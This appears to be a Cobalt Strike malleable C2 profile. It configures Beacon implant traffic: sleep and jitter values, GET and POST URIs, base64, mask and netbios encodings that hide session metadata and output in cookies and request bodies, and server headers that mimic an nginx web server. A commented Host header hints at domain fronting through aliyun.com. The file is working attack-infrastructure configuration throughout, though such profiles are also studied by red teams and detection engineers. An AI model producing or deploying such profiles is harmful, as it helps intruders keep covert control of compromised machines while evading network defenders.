# default sleep time is 60s
set sleeptime "300";
set jitter "7";

# set tasks_max_size "4000000";

# define indicators for an HTTP GET
http-get {

	set uri "/www/handle/doc";

	client {
		#header "Host" "aliyun.com";
		# base64 encode session metadata and store it in the Cookie header.
		metadata {
			base64;
			prepend "SESSIONID=";
			header "Cookie";
		}
	}

	server {
		# server should send output with no changes
		#header "Content-Type" "application/octet-stream";
		    header "Server" "nginx/1.10.3 (Ubuntu)";
    		header "Content-Type" "application/octet-stream";
        	header "Connection" "keep-alive";
        	header "Vary" "Accept";
        	header "Pragma" "public";
        	header "Expires" "0";
        	header "Cache-Control" "must-revalidate, post-check=0, pre-check=0";

		output {
			mask;
			netbios;
			prepend "data=";
			append "%%";
			print;
		}
	}
}

# define indicators for an HTTP 
http-post {
	# Same as above, Beacon will randomly choose from this pool of URIs [if multiple URIs are provided]
	set uri "/IMXo";
	client {
		#header "Content-Type" "application/octet-stream";				
        		
		id {				
			mask;
			netbiosu;
			prepend "user=";
			append "%%";
			header "User";
		}

		# post our output with no real changes
		output {
			mask;
			base64url;
			prepend "data=";
			append "%%";		
			print;
		}
	}

	# The server's response to our HTTP POST
	server {
		header "Server" "nginx/1.10.3 (Ubuntu)";
    		header "Content-Type" "application/octet-stream";
        	header "Connection" "keep-alive";
       	 	header "Vary" "Accept";
        	header "Pragma" "public";
        	header "Expires" "0";
        	header "Cache-Control" "must-revalidate, post-check=0, pre-check=0";

		# this will just print an empty string, meh...
		output {
			mask;
			netbios;
			prepend "data=";
			append "%%";
			print;
		}
	}
}
